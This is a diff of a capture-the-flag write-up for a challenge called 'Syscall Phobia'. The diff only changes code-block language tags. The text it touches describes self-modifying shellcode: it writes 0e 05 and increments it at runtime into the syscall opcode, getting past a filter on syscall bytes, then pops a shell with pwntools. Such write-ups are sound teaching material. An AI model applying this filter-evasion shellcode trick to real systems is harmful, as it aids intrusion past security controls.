@@ -96,13 +96,13 @@ Initially, I thought of somehow not using `syscall` instructions at all. However
 > Or even easier, start with `0e 05` ... in memory, and use `inc  byte ptr  syscall_location[rip]` to modify it to `0f 05` ...
 
 As the opcode of `syscall` is `0f 05`, the idea is to first write `0e 05` in our shellcode, and then increment the instruction using `inc BYTE PTR [rip]` to make it `0f 05`: 
-```c
+```shell
 fe 05 00 00 00 00       inc    BYTE PTR [rip]   // increment instruction below by 1
 0e 05                   ???                     // becomes syscall when executed
 ```
 
 Now that we have a way to use `syscall` instructions, all that's left to do is write shellcode to pop shell, which is trivial with `pwntools`:
-```python
+``` shell
 $ python
 Python 2.7.18 (default, Aug  4 2020, 11:16:42)
 [GCC 9.3.0] on linux2
@@ -157,7 +157,7 @@ payload = ''.join(a)
 ```
 
 When the binary executes this shellcode, it pops a shell:
-```python
+```shell
 $ python solve.py
 [*] '/mnt/c/Users/Brandon Chong/Downloads/writeup stuffs/Syscall Phobia/syscall-phobia'
     Arch:     amd64-64-little
